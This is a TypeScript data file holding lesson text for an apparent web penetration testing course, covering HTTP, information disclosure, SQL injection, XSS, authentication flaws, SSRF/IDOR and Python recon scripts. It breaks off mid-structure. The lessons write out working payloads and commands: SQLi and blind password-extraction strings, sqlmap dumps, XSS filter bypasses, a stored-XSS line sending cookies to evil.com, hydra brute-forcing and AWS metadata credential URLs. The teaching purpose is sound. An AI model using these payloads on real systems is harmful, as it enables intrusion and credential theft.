// Course data — all lesson content is stored as plain strings (no template literals)
// to avoid backtick escaping issues in TypeScript.

const mod1 = {
  title: 'Module 1: HTTP Fundamentals',
  lessons: [
    {
      key: 'mod1_0',
      title: 'How Browsers Talk to Servers',
      content:
        "Every web interaction starts with HTTP - the protocol that browsers and servers use to communicate.\n\n" +
        "What's happening when you type a URL:\n" +
        "1. Browser resolves the domain via DNS and gets an IP\n" +
        "2. Opens a TCP connection to that IP on port 80 or 443\n" +
        "3. Sends an HTTP request\n\n" +
        "HTTP Request anatomy:\n" +
        "GET /index.html HTTP/1.1\n" +
        "Host: example.com\n" +
        "User-Agent: Mozilla/5.0\n" +
        "Accept: text/html\n" +
        "Cookie: session_id=abc123\n\n" +
        "HTTP Response anatomy:\n" +
        "HTTP/1.1 200 OK\n" +
        "Content-Type: text/html\n" +
        "Content-Length: 1245\n" +
        "Set-Cookie: session=xyz\n\n" +
        "<html>...</html>\n\n" +
        "Methods you need to know:\n" +
        "- GET - retrieves data (query params in URL)\n" +
        "- POST - sends data (form submissions, APIs)\n" +
        "- PUT/DELETE - used in REST APIs\n" +
        "- PATCH - partial update\n\n" +
        "Status codes to memorize:\n" +
        "- 200 OK - request succeeded\n" +
        "- 301/302 - redirect\n" +
        "- 400 Bad Request - client error\n" +
        "- 401 Unauthorized - not authenticated\n" +
        "- 403 Forbidden - authenticated but not authorized\n" +
        "- 404 Not Found - resource does not exist\n" +
        "- 500 Internal Server Error - server broke\n\n" +
        "Tip: Use the Network tab in browser DevTools to see every request your browser makes. Right-click and copy as cURL to replay requests in your terminal.",
    },
    {
      key: 'mod1_1',
      title: 'Headers, Cookies & Sessions',
      content:
        "HTTP is stateless - servers do not remember who you are between requests. Cookies solve this.\n\n" +
        "How cookies work:\n" +
        "Server response:\n" +
        "Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict\n" +
        "Browser stores this. Every subsequent request:\n" +
        "Cookie: session_id=abc123\n\n" +
        "Cookie attributes:\n" +
        "- HttpOnly - JS cannot read it (prevents XSS theft)\n" +
        "- Secure - only sent over HTTPS\n" +
        "- SameSite - prevents CSRF (Strict blocks all cross-origin, Lax allows top-level nav)\n" +
        "- Max-Age/Expires - how long the cookie lives\n\n" +
        "Common attack vectors:\n" +
        "- Cookie theft via XSS leading to session hijacking\n" +
        "- Cookie prediction (weak RNG) leading to impersonation\n" +
        "- Missing Secure flag - cookie intercepted over HTTP\n" +
        "- Missing HttpOnly - JS-accessible and vulnerable to XSS theft\n\n" +
        "Testing cookies:\n" +
        "- View cookies in browser DevTools (Application tab, Cookies section)\n" +
        "- Replay with curl: curl -b \"session_id=abc123\" https://target.com/dashboard\n" +
        "- Edit cookie value and refresh to test authorization\n\n" +
        "Session tokens are usually:\n" +
        "- Random UUIDs (hard to guess)\n" +
        "- JWTs (base64-encoded JSON with signature)\n" +
        "- Legacy apps sometimes use predictable values (timestamps, user IDs)\n\n" +
        "Always test what happens when you modify or clear your session cookie.",
    },
    {
      key: 'mod1_2',
      title: 'Burp Suite Setup',
      content:
        "Burp Suite is the industry-standard tool for web testing. Here is how to set it up properly.\n\n" +
        "Installation:\n" +
        "Download from PortSwigger (Community edition is free)\n" +
        "Requires Java 11+\n" +
        "Run: java -jar burpsuite_community.jar\n\n" +
        "Proxy setup (browser):\n" +
        "1. Go to browser settings, Proxy, Manual\n" +
        "2. Set HTTP Proxy to 127.0.0.1:8080\n" +
        "3. Install Burp's CA cert (visit http://burpsuite/cert, download, import into browser)\n\n" +
        "Key Burp tabs:\n" +
        "- Proxy > Intercept - pause requests and responses to inspect or modify\n" +
        "- Proxy > HTTP History - all traffic you have proxied\n" +
        "- Target > Site map - discovered URLs and parameters\n" +
        "- Repeater - manually modify and resend requests\n" +
        "- Intruder - automate parameter fuzzing\n" +
        "- Decoder - encode and decode data (URL, Base64, etc.)\n\n" +
        "Scoped filtering:\n" +
        "Always set your target scope before testing:\n" +
        "- Target > Scope > Add host and protocol\n" +
        "- Proxy > Options > Intercept is on toggle - enable Use suite scope\n\n" +
        "This prevents you from accidentally hitting unrelated sites.\n\n" +
        "Essential Burp shortcuts:\n" +
        "- Ctrl+R - send to Repeater\n" +
        "- Ctrl+I - send to Intruder\n" +
        "- Ctrl+U - URL encode selection\n" +
        "- Ctrl+Shift+U - URL decode selection\n\n" +
        "Tip: Use Scope filter in HTTP History to only see traffic to your target. Your history fills up fast on real engagements.",
    },
  ],
};

const mod2 = {
  title: 'Module 2: Information Disclosure',
  lessons: [
    {
      key: 'mod2_0',
      title: 'Robots.txt, Source Maps & Directory Busting',
      content:
        "Applications often accidentally expose things they should not. Finding these is often the first step in a pentest.\n\n" +
        "Robots.txt:\n" +
        "Search engines follow this file to know what to skip indexing. Pentesters read it to find what the developer did not want indexed.\n\n" +
        "User-agent: *\n" +
        "Disallow: /admin/\n" +
        "Disallow: /backup/\n" +
        "Disallow: /config/\n" +
        "Sitemap: /sitemap.xml\n\n" +
        "Always check:\n" +
        "- /robots.txt\n" +
        "- /sitemap.xml\n" +
        "- /.git/ (exposed git repo - contains full source code history)\n" +
        "- /.svn/\n" +
        "- /.env (credentials exposed)\n\n" +
        "Source maps (.map files):\n" +
        "Minified JS often has accompanying source maps for debugging. If exposed:\n" +
        "/static/js/app.js.map - reveals full unbundled source code\n\n" +
        "Directory enumeration:\n" +
        "Common tools: gobuster, ffuf, dirsearch\n" +
        "High-value paths to look for:\n" +
        "/admin /login /dashboard /api /backup /db /config /.git\n" +
        "/test /debug /dev /dist /src /wp-admin /phpmyadmin\n\n" +
        "Tip: Pay attention to 401 and 403 responses. They mean the resource exists but you cannot access it. That is often more interesting than a 404.",
    },
    {
      key: 'mod2_1',
      title: 'Git Exposure (git-dumper)',
      content:
        "Exposed .git directories are one of the highest-value findings in web pentesting. They contain the entire history of every code change ever made.\n\n" +
        "What you will find:\n" +
        "- Full source code (sometimes with credentials hardcoded)\n" +
        "- Database credentials in config files\n" +
        "- AWS keys in CI/CD pipelines\n" +
        "- Internal documentation\n" +
        "- Old vulnerabilities that were fixed but still in history\n\n" +
        "Dumping a git repo:\n" +
        "Tool: git-dumper (pip install git-dumper)\n" +
        "git-dumper https://target.com/.git /tmp/target-repo\n\n" +
        "Or manually:\n" +
        "mkdir repo && cd repo && git init && git remote add origin https://target.com/.git && git fetch --all && git checkout origin/main\n\n" +
        "What to look for once you have the repo:\n" +
        "- Find credentials: grep -r \"password\" --no-index .\n" +
        "- Find API keys: grep -r \"api_key\" --no-index .\n" +
        "- Check .env file: cat .env\n" +
        "- Find database connection strings: grep -r \"mysql\\|postgres\\|mongodb\" --no-index .\n\n" +
        "Real example: Tesla left their GitHub .git exposed in 2017. Researchers found AWS keys that gave read/write access to Tesla's cloud infrastructure.\n\n" +
        "Defensive fix (nginx):\n" +
        "location ~ /\\.git { deny all; }",
    },
    {
      key: 'mod2_2',
      title: 'Finding Exposed APIs & Debug Endpoints',
      content:
        "Modern web apps expose APIs everywhere. Finding them is a matter of knowing where to look.\n\n" +
        "Common API patterns:\n" +
        "/api/v1/users /api/v2/posts /api/auth/login /api/debug/queries /api/health /swagger.json /openapi.json /api-docs\n\n" +
        "Swagger and OpenAPI docs:\n" +
        "If exposed, they give you the complete API schema - every endpoint, parameter, and expected response.\n" +
        "Common locations:\n" +
        "/swagger/index.html /api-docs /v1/api-docs /swagger-ui/ /api/swagger.json\n\n" +
        "Debug endpoints in production:\n" +
        "- /debug/pprof (Go apps)\n" +
        "- /actuator/health (Spring Boot)\n" +
        "- /debug vars (Node.js express in dev mode)\n" +
        "- /?debug=1\n\n" +
        "HTTP methods enumeration:\n" +
        "Tools like ffuf can test all HTTP methods:\n" +
        "ffuf -w methods.txt -u https://target.com/api -X FUZZ\n\n" +
        "Version fingerprinting:\n" +
        "API responses often leak version info in headers:\n" +
        "X-API-Version: 2.1.3\n" +
        "Server: Apache/2.4.41 (Ubuntu)\n\n" +
        "Always look at response headers - they often tell you more than the body.",
    },
  ],
};

const mod3 = {
  title: 'Module 3: SQL Injection',
  lessons: [
    {
      key: 'mod3_0',
      title: 'In-Band SQLi: Finding & Exploiting',
      content:
        "SQL injection is still one of the most critical web vulnerabilities. It lets you read, write, and sometimes execute commands on the database server.\n\n" +
        "How it works:\n" +
        "User input is not sanitized before being embedded in a SQL query:\n" +
        "query = f\"SELECT * FROM users WHERE name = '{name}'\"\n" +
        "User enters: ' OR '1'='1\n" +
        "Query becomes: SELECT * FROM users WHERE name = '' OR '1'='1'\n\n" +
        "Finding SQLi - classic tests:\n" +
        "' - triggers SQL error\n" +
        "\" - might trigger error or behave differently\n" +
        "' OR '1'='1 - bypasses auth or returns extra rows\n" +
        "' AND '1'='2 - should return nothing\n" +
        "' UNION SELECT 1,2,3 -- - - test for UNION support\n\n" +
        "Error-based detection:\n" +
        "If the app reflects SQL errors to the page, you can extract data through error messages:\n" +
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables)) -- -\n" +
        "# MS-SQL error leaks table names\n\n" +
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -\n" +
        "# MySQL error leaks current DB name\n\n" +
        "The key insight: Every parameter is a candidate. Test all of them - query params, POST body, cookies, headers (X-Forwarded-For is commonly injectable).\n\n" +
        "Tools:\n" +
        "sqlmap automates injection:\n" +
        "sqlmap -u \"https://target.com/search?q=1\" --batch --dbs\n" +
        "sqlmap -u \"https://target.com/login\" --data \"user=admin&pass=*\" --dbs",
    },
    {
      key: 'mod3_1',
      title: 'Blind SQLi: Time-Based & Boolean',
      content:
        "Blind SQLi is when the app does not show you error messages or query results, but you can still extract data by asking true or false questions.\n\n" +
        "Boolean-based blind:\n" +
        "# Normal: page loads in 200ms\n" +
        "# Inject true condition: ' AND 1=1 -- - - page loads normally (200ms)\n" +
        "# Inject false condition: ' AND 1=2 -- - - different response or blank page\n\n" +
        "To extract admin password hash character by character:\n" +
        "' AND SUBSTRING((SELECT password FROM users WHERE role='admin' LIMIT 1),1,1)='a' -- -\n" +
        "If true - normal response. If false - different response.\n\n" +
        "Time-based blind (use when there is no visible difference):\n" +
        "MySQL: ' AND IF(1=1, SLEEP(3), 0) -- -\n" +
        "MS-SQL: '; WAITFOR DELAY '00:00:03'-- -\n" +
        "PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE 0 END-- -\n\n" +
        "Automating blind SQLi with sqlmap:\n" +
        "sqlmap -u \"https://target.com/product?id=1\" --batch \\\n" +
        "  --level=5 --risk=3 --time-sec=3 --dbms=mysql --passwords\n\n" +
        "Practical timing: Time-based blind is slow. A 10-character password takes roughly 5 minutes to guess at 1 char per minute. Use boolean-based if possible - it is faster.\n\n" +
        "Tip: Always test for blind injection with both ' AND 1=1 and ' AND 1=2 side by side. If they produce different responses, you have injection.",
    },
    {
      key: 'mod3_2',
      title: 'SQLMap Automation',
      content:
        "sqlmap automates the entire SQL injection process - from detection to data extraction to shell access.\n\n" +
        "Basic usage:\n" +
        "# Detect injection:\n" +
        "sqlmap -u \"https://target.com/search?q=test\"\n\n" +
        "# Get databases:\n" +
        "sqlmap -u \"https://target.com/search?q=test\" --dbs\n\n" +
        "# Get tables from a database:\n" +
        "sqlmap -u \"https://target.com/search?q=test\" -D target_db --tables\n\n" +
        "# Dump everything:\n" +
        "sqlmap -u \"https://target.com/search?q=test\" -D target_db -T users --dump\n\n" +
        "POST-based injection:\n" +
        "sqlmap -u \"https://target.com/login\" \\\n" +
        "  --data=\"username=admin&password=test\" --batch --dbs\n\n" +
        "Cookies (authenticated testing):\n" +
        "sqlmap -u \"https://target.com/profile?id=1\" \\\n" +
        "  --cookie=\"session_id=abc123\" --level=2 --dbs\n\n" +
        "Advanced options:\n" +
        "# Specify injection point (when auto-detect fails):\n" +
        "sqlmap -u \"https://target.com\" \\\n" +
        "  --data=\"id=1&price=500\" -p price\n\n" +
        "# Use proxy to see traffic:\n" +
        "sqlmap --proxy=http://127.0.0.1:8080\n\n" +
        "# Custom headers:\n" +
        "sqlmap -u \"https://target.com\" \\\n" +
        "  --header=\"User-Agent: Mozilla/5.0\"\n\n" +
        "WARNING: Always use --batch in automated scans. sqlmap will ask for confirmation before doing dangerous things like --os-shell.",
    },
  ],
};

const mod4 = {
  title: 'Module 4: Cross-Site Scripting (XSS)',
  lessons: [
    {
      key: 'mod4_0',
      title: 'Reflected, Stored & DOM XSS',
      content:
        "XSS lets you run arbitrary JavaScript in other users' browsers. Three main types:\n\n" +
        "Reflected XSS:\n" +
        "The malicious script is in the request and reflected in the response without sanitization.\n" +
        "https://target.com/search?q=<script>alert(1)</script>\n" +
        "Page shows: Results for <script>alert(1)</script>\n" +
        "Requires the victim to click a crafted link.\n\n" +
        "Stored (Persistent) XSS:\n" +
        "The payload is saved on the server and served to every user who views the page.\n" +
        "Post a comment with:\n" +
        "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n" +
        "Every admin who views the comment page has their cookie stolen.\n" +
        "Highest impact - no user interaction needed beyond visiting the page.\n\n" +
        "DOM XSS:\n" +
        "The page is vulnerable because client-side JavaScript processes user input and writes it to the DOM without sanitization.\n" +
        "const params = new URLSearchParams(window.location.search);\n" +
        "document.getElementById('output').innerHTML = params.get('name');\n" +
        "Attacker visits: ?name=<img src=x onerror=alert(1)>\n\n" +
        "Finding XSS manually:\n" +
        "Test payload: <script>alert(1)</script>\n" +
        "Test everywhere: URL parameters, form inputs, HTTP headers (User-Agent and Referer are often reflected), cookie values\n\n" +
        "Bug bounty tip: Most programs categorize XSS differently. DOM XSS often has its own report type since it is purely client-side.",
    },
    {
      key: 'mod4_1',
      title: 'Filter Evasion Techniques',
      content:
        "Applications often have XSS filters that block basic payloads. Bypass them by understanding what they are checking.\n\n" +
        "Case insensitive filters (blocks 'script' but not 'SCRIPT'):\n" +
        "<img src=x onerror=alert(1)> - lowercase works\n" +
        "<ScRiPt>alert(1)</ScRiPt> - mixed case bypasses\n\n" +
        "Blacklist filters that miss event handlers:\n" +
        "Blocks <script> tags but not:\n" +
        "<img src=x onerror=alert(1)>\n" +
        "<svg onload=alert(1)>\n" +
        "<body onload=alert(1)>\n" +
        "<video><source onerror=alert(1)>\n" +
        "<marquee onstart=alert(1)>\n\n" +
        "Blocked 'onerror' - try other events:\n" +
        "onload onerror onmouseover onfocus onblur\n" +
        "onkeydown onkeyup onkeypress\n" +
        "oninput onchange ontoggle\n\n" +
        "HTML entity encoding bypass:\n" +
        "If the app HTML-encodes < and > but you control attribute values:\n" +
        "<a href=\"javascript:alert(1)\">click</a>\n\n" +
        "Polyglot payloads (work in multiple contexts):\n" +
        "jaVasCript:/*-/*`/*:`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    },
  ],
};

const mod5 = {
  title: 'Module 5: Authentication Flaws',
  lessons: [
    {
      key: 'mod5_0',
      title: 'Brute Force & Credential Stuffing',
      content:
        "Authentication is a common attack surface. Here is how to test it.\n\n" +
        "Brute force attacks:\n" +
        "hydra -l admin -P passwords.txt target.com http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid password\"\n\n" +
        "Burp Intruder:\n" +
        "1. Proxy a login request > Send to Intruder\n" +
        "2. Positions tab > mark the password parameter as payload position\n" +
        "3. Payloads tab > load wordlist\n" +
        "4. Start attack\n\n" +
        "What to test:\n" +
        "- Username enumeration (does 'admin' vs 'fakeuser' give different responses?)\n" +
        "- Password policies (minimum length? complexity requirements?)\n" +
        "- Account lockout (5 failed logins > locked for 30 min?)\n" +
        "- MFA bypass (can you access without MFA by skipping the step?)\n\n" +
        "Credential stuffing:\n" +
        "Using leaked credentials from other breaches on this target.\n" +
        "Check haveibeenpwned for email breaches:\n" +
        "curl \"https://haveibeenpwned.com/api/v3/breachedaccount/user@email.com\"\n\n" +
        "Rate limiting tests:\n" +
        "for i in {1..20}; do curl -X POST https://target.com/login -d \"user=admin&pass=test\"; echo \"Attempt $i\"; done\n\n" +
        "If there is no rate limiting and no lockout policy, login brute force is trivial.",
    },
    {
      key: 'mod5_1',
      title: 'JWT Manipulation',
      content:
        "JSON Web Tokens (JWT) are commonly used for authentication. They are often vulnerable to tampering.\n\n" +
        "JWT structure:\n" +
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n" +
        "Header.Payload.Signature\n\n" +
        "Decode: echo \"eyJ...\" | base64 -d\n\n" +
        "Common JWT vulnerabilities:\n\n" +
        "1. None algorithm (alg: 'none'):\n" +
        "Change header to: {\"alg\":\"none\",\"typ\":\"JWT\"}\n" +
        "Remove signature part (leave trailing dot)\n" +
        "Now it is a signed token with no verification.\n\n" +
        "2. Algorithm confusion (RS256 to HS256):\n" +
        "If the server expects RS256 (asymmetric) but you change the alg to HS256 and sign with the public key:\n" +
        "The public key used for RS256 verification can be used as an HS256 secret.\n\n" +
        "3. Weak secrets:\n" +
        "Crack the HMAC secret: john --wordlist=rockyou.txt jwt_hashes.txt\n" +
        "hashcat -m 16500 jwt.txt wordlist.txt\n\n" +
        "Always test: Change the sub (subject) claim to another user ID. If the server trusts the token without re-verifying the identity, you can impersonate anyone.",
    },
  ],
};

const mod6 = {
  title: 'Module 6: SSRF & IDOR',
  lessons: [
    {
      key: 'mod6_0',
      title: 'Server-Side Request Forgery',
      content:
        "SSRF lets you make the server perform requests on your behalf - often to internal services that are not accessible from the internet.\n\n" +
        "Classic SSRF pattern:\n" +
        "GET /api/fetch?url=https://example.com\n" +
        "Attacker changes url to internal services:\n" +
        "?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)\n" +
        "?url=http://localhost:6379/                   (Redis)\n" +
        "?url=http://internal-db:5432/                (PostgreSQL)\n\n" +
        "AWS metadata exploitation:\n" +
        "If running on AWS, the metadata service is at:\n" +
        "http://169.254.169.254/latest/meta-data/\n" +
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n" +
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n" +
        "This returns AWS keys if the instance has an IAM role.\n\n" +
        "Blind SSRF:\n" +
        "Sometimes you cannot see the response but you can detect impact through timing or side effects:\n" +
        "?url=http://internal:22 - if open, fast response. If filtered, timeout.\n\n" +
        "Bypassing SSRF filters:\n" +
        "- localhost variations: 127.0.0.1, localhost, 0x7f000001 (hex), [::1]\n" +
        "- DNS resolution tricks: Burp Collaborator payload, own domain resolving to internal IP\n" +
        "- URL parsing inconsistencies:\n" +
        "http://example.com@127.0.0.1\n" +
        "http://127.0.0.1%23@example.com (URL encode of # fragment)",
    },
    {
      key: 'mod6_1',
      title: 'IDOR: Insecure Direct Object References',
      content:
        "IDOR happens when the app uses user-supplied input to access objects directly, without checking if the current user has permission.\n\n" +
        "Example:\n" +
        "GET /api/users/12345 - returns your profile\n" +
        "GET /api/users/12346 - returns another user's profile - IDOR!\n\n" +
        "How to find IDOR:\n" +
        "1. Find endpoints that expose object IDs (user IDs, file IDs, order IDs, record IDs)\n" +
        "2. Map out which requests are authorized for your account\n" +
        "3. Try accessing other users' resources by changing IDs\n" +
        "4. Look for sequential IDs (12345, 12346, 12347 - easy to enumerate)\n\n" +
        "Tools:\n" +
        "Burp Intruder: capture request for /api/profile, set payload to enumerate user IDs 1-1000.\n" +
        "Look for 200 responses with other users' data.\n\n" +
        "Mass assignment IDOR:\n" +
        "Sometimes the app grants you access legitimately, but blindly trusts parameters you send:\n" +
        "PUT /api/users/12345 with {\"name\":\"John\",\"email\":\"john@example.com\"}\n" +
        "Try adding a privileged field:\n" +
        "PUT /api/users/12345 with {\"name\":\"John\",\"role\":\"admin\"}\n" +
        "Server accepts role: admin and promotes you!\n\n" +
        "Test every parameter: IDOR is not just in URLs - POST body, JSON, form data, and headers can all carry object references.",
    },
  ],
};

export const COURSES = [
  {
    id: 1,
    title: 'Web Penetration Testing from Scratch',
    description: 'Learn how web apps actually get broken. Covers the OWASP Top 10 with hands-on labs you run against real vulnerable targets.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Beginner – Intermediate',
    duration: '12 hours',
    lessons: 28,
    image: '🌐',
    modules: [mod1, mod2, mod3, mod4, mod5, mod6],
  },
  {
    id: 2,
    title: 'Python for Security Automation',
    description: 'Stop doing everything manually. Learn to automate recon, scanning, and reporting with Python. Build your own security tools.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Intermediate',
    duration: '8 hours',
    lessons: 18,
    image: '🐍',
    modules: [
      {
        title: 'Module 1: Python Refresher',
        lessons: [
          {
            key: 'mod2_1_0',
            title: 'Requests, BeautifulSoup & API Basics',
            content:
              "Most of your automation work will be HTTP requests plus parsing the response. Here is what you need.\n\n" +
              "The requests library:\n" +
              "import requests\n\n" +
              "r = requests.get('https://target.com/api/users')\n" +
              "print(r.status_code)\n" +
              "print(r.json())  # parse JSON response\n" +
              "print(r.text)     # raw text\n\n" +
              "r = requests.post('https://target.com/login', data={'username': 'admin', 'password': 'password123'})\n\n" +
              "r = requests.get('https://target.com/api/profile', headers={'Authorization': 'Bearer YOUR_TOKEN'}, cookies={'session': 'abc123'})\n\n" +
              "BeautifulSoup for parsing HTML:\n" +
              "from bs4 import BeautifulSoup\n" +
              "html = r.text\n" +
              "soup = BeautifulSoup(html, 'html.parser')\n" +
              "links = soup.find_all('a')\n" +
              "for link in links: print(link.get('href'))\n\n" +
              "Working with APIs (REST):\n" +
              "requests.get(url, params={})    # read\n" +
              "requests.post(url, json={})     # create\n" +
              "requests.put(url, json={})      # full replace\n" +
              "requests.patch(url, json={})   # partial update\n" +
              "requests.delete(url)            # delete",
          },
          {
            key: 'mod2_1_1',
            title: 'Working with JSON & Data Files',
            content:
              "You will handle JSON constantly. Python makes this easy.\n\n" +
              "JSON handling:\n" +
              "import json\n\n" +
              "# Parse JSON from API response\n" +
              "r = requests.get('https://api.github.com/users/octocat')\n" +
              "data = r.json()\n" +
              "print(data['login'], data['followers'])\n\n" +
              "# Write JSON to file\n" +
              "with open('output.json', 'w') as f:\n" +
              "    json.dump(data, f, indent=2)\n\n" +
              "# Read JSON from file\n" +
              "with open('data.json') as f:\n" +
              "    data = json.load(f)\n\n" +
              "CSV handling:\n" +
              "import csv\n\n" +
              "# Write\n" +
              "with open('vulns.csv', 'w', newline='') as f:\n" +
              "    writer = csv.DictWriter(f, fieldnames=['url', 'severity', 'finding'])\n" +
              "    writer.writeheader()\n" +
              "    writer.writerows(vulnerabilities)\n\n" +
              "# Read\n" +
              "with open('targets.csv') as f:\n" +
              "    reader = csv.DictReader(f)\n" +
              "    for row in reader: scan(row['url'])",
          },
        ],
      },
      {
        title: 'Module 2: Recon Automation',
        lessons: [
          {
            key: 'mod2_2_0',
            title: 'Subdomain Enumeration with Python',
            content:
              "Subdomain enumeration is one of the most important recon steps. Here is how to automate it.\n\n" +
              "Wordlist-based enumeration:\n" +
              "import requests\n\n" +
              "def enumerate_subdomains(domain, wordlist_file):\n" +
              "    found = []\n" +
              "    with open(wordlist_file) as f:\n" +
              "        for line in f:\n" +
              "            word = line.strip()\n" +
              "            subdomain = f\"{word}.{domain}\"\n" +
              "            url = f\"https://{subdomain}\"\n" +
              "            try:\n" +
              "                r = requests.get(url, timeout=3, verify=False, allow_redirects=False)\n" +
              "                if r.status_code < 500:\n" +
              "                    print(f\"[+] Found: {subdomain} ({r.status_code})\")\n" +
              "                    found.append(subdomain)\n" +
              "            except requests.exceptions.RequestException:\n" +
              "                pass\n" +
              "    return found\n\n" +
              "Certificate Transparency (using crt.sh):\n" +
              "import requests\n\n" +
              "def ct_enumeration(domain):\n" +
              "    url = f\"https://crt.sh/?q=%25.{domain}&output=json\"\n" +
              "    r = requests.get(url, timeout=30)\n" +
              "    data = r.json()\n" +
              "    subdomains = set()\n" +
              "    for entry in data:\n" +
              "        name = entry['name_value']\n" +
              "        subdomains.update(name.replace('*.', '').split('\\n'))\n" +
              "    return sorted(subdomains)\n\n" +
              "Practical note: Combine all approaches - CT logs give you the most comprehensive results, wordlist gives you valid subdomains that might not have been in CT logs, and DNS resolution filters out non-existent ones.",
          },
          {
            key: 'mod2_2_1',
            title: 'Port Scanning with Python Socket',
            content:
              "You can build a fast port scanner with Python's socket library. No nmap needed for basic scans.\n\n" +
              "Simple TCP scanner:\n" +
              "import socket\n" +
              "from concurrent.futures import ThreadPoolExecutor\n\n" +
              "def scan_port(host, port, timeout=2):\n" +
              "    try:\n" +
              "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
              "        sock.settimeout(timeout)\n" +
              "        result = sock.connect_ex((host, port))\n" +
              "        sock.close()\n" +
              "        if result == 0:\n" +
              "            try:\n" +
              "                service = socket.getservbyport(port)\n" +
              "            except:\n" +
              "                service = 'unknown'\n" +
              "            return port, service\n" +
              "    except:\n" +
              "        pass\n" +
              "    return None\n\n" +
              "def scan_range(host, start_port=1, end_port=1024, threads=100):\n" +
              "    open_ports = []\n" +
              "    with ThreadPoolExecutor(max_workers=threads) as executor:\n" +
              "        futures = [executor.submit(scan_port, host, p) for p in range(start_port, end_port+1)]\n" +
              "        for future in futures:\n" +
              "            result = future.result()\n" +
              "            if result:\n" +
              "                open_ports.append(result)\n" +
              "                print(f\"[+] Open: {result[0]} ({result[1]})\")\n" +
              "    return sorted(open_ports)\n\n" +
              "Common high-value ports: 21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80 HTTP, 110 POP3, 143 IMAP, 443 HTTPS, 445 SMB, 3306 MySQL, 3389 RDP, 5432 PostgreSQL, 8080 HTTP-alt",
          },
          {
            key: 'mod2_2_2',
            title: 'CORS Misconfiguration Checks',
            content:
              "CORS misconfigurations can allow attackers to steal data from authenticated users. Here is how to check for them.\n\n" +
              "What is CORS: Browsers enforce Same-Origin Policy. CORS is a way for servers to explicitly allow cross-origin requests.\n\n" +
              "Misconfiguration to look for:\n\n" +
              "import requests\n\n" +
              "def check_cors(url):\n" +
              "    r1 = requests.get(url, headers={'Origin': 'null'})\n" +
              "    print(f\"Origin 'null': {r1.headers.get('Access-Control-Allow-Origin', 'MISSING')}\")\n\n" +
              "    r2 = requests.get(url, headers={'Origin': 'https://evil.com'})\n" +
              "    print(f\"Reflected: {r2.headers.get('Access-Control-Allow-Origin', 'MISSING')}\")\n\n" +
              "    acr = r2.headers.get('Access-Control-Allow-Credentials', '')\n" +
              "    if acr == 'true':\n" +
              "        print(\"[!] Allows credentials with arbitrary origin\")\n\n" +
              "Exploiting CORS for account takeover:\n" +
              "The attacker hosts a page that uses fetch with credentials include.\n" +
              "If the target has a misconfigured CORS policy allowing the attacker's origin,\n" +
              "the victim's browser sends the session cookie, and the attacker receives the data.\n\n" +
              "Dangerous combinations:\n" +
              "- Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true\n" +
              "- Origin reflection with credentials\n" +
              "- Access-Control-Allow-Origin: null",
          },
        ],
      },
      {
        title: 'Module 3: Vulnerability Scanning',
        lessons: [
          {
            key: 'mod2_3_0',
            title: 'Writing a Basic CVE Scanner',
            content:
              "You can automate CVE scanning for your targets by checking versions against known vulnerabilities.\n\n" +
              "Basic version scanner:\n" +
              "import requests\n" +
              "import re\n\n" +
              "def detect_versions(target):\n" +
              "    versions = {}\n" +
              "    r = requests.get(target)\n" +
              "    server = r.headers.get('Server', '')\n" +
              "    versions['server'] = server\n" +
              "    html = r.text.lower()\n" +
              "    if 'wordpress' in html:\n" +
              "        match = re.search(r'version/([0-9.]+)', html)\n" +
              "        versions['cms'] = f\"WordPress {match.group(1) if match else 'unknown'}\"\n" +
              "    return versions\n\n" +
              "Check CVE database (NVD API - no auth required):\n" +
              "def check_cve(product, version):\n" +
              "    url = f\"https://services.nvd.nist.gov/rest/json/cves/2.0\"\n" +
              "    params = {'keywordSearch': product, 'resultsPerPage': 5}\n" +
              "    r = requests.get(url, params=params, timeout=10)\n" +
              "    data = r.json()\n" +
              "    vulns = []\n" +
              "    for item in data.get('vulnerabilities', []):\n" +
              "        cve = item['cve']\n" +
              "        cve_id = cve['id']\n" +
              "        desc = cve['descriptions'][0]['value']\n" +
              "        if version in desc:\n" +
              "            vulns.append({'id': cve_id, 'desc': desc[:200]})\n" +
              "    return vulns\n\n" +
              "NVD API tips: Rate limit is 10 requests per 10 seconds. No API key needed for basic access.",
          },
          {
            key: 'mod2_3_1',
            title: 'XSS Detection with Python',
            content:
              "Building a basic XSS scanner helps you understand how automated tools find vulnerabilities.\n\n" +
              "Reflected XSS detection:\n" +
              "XSS_PAYLOADS = [\n" +
              "    '<script>alert(1)</script>',\n" +
              "    '<img src=x onerror=alert(1)>',\n" +
              "    '\"<script>alert(1)</script>',\n" +
              "    \"'><img src=x onerror=alert(1)>\",\n" +
              "    '<svg onload=alert(1)>',\n" +
              "]\n\n" +
              "def find_reflected_xss(url, param_name, param_value):\n" +
              "    for payload in XSS_PAYLOADS:\n" +
              "        test_value = param_value + payload\n" +
              "        r = requests.get(url, params={param_name: test_value})\n" +
              "        if payload in r.text:\n" +
              "            # Check if it is actually executable (not HTML-escaped)\n" +
              "            if payload.replace('<', '&lt;') not in r.text:\n" +
              "                return payload\n" +
              "    return None\n\n" +
              "Key insight: Detection is easy. The hard part is distinguishing dangerous reflection from safe reflection.\n" +
              "Check if: the payload is reflected without HTML encoding, and it is in a context where JS can execute.\n\n" +
              "Verify manually in Repeater: if you see the raw script tag in the response, it is likely real.\n" +
              "If you see &lt;script&gt;, it is being encoded and likely not exploitable.",
          },
        ],
      },
      {
